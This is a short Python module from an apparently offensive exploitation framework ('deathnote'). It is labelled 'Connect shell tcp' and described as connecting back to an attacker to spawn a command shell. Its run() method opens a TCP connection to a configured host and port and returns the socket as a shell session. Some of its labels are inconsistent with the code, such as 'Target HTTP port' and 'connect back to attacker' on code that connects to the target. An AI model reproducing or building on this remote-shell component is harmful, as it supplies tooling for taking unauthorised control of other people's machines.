from deathnote_module import *
import socket

class Module(Listener):
	__info__ = {
		"name": "Connect shell tcp",
		"description": "Connect back to attacker and spawn a command shell",
		"type": "reverse",
		"session": "shell",
	}
	
	rhost = OptString("127.0.0.1", "Target IPv4 or IPv6 address")
	rport = OptPort(6000, "Target HTTP port", "yes")

	def run(self):
		try:
			self.tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)			
			self.tcpsock.connect((self.rhost,int(self.rport)))
			return (self.tcpsock, (self.rhost, self.rport))
		except KeyboardInterrupt as e:
			print_error(e)
			return False
		except OSError as e:
			print_error(e)
			return False
		except self.tcpsock.timeout:
			return False
		except:
			return False
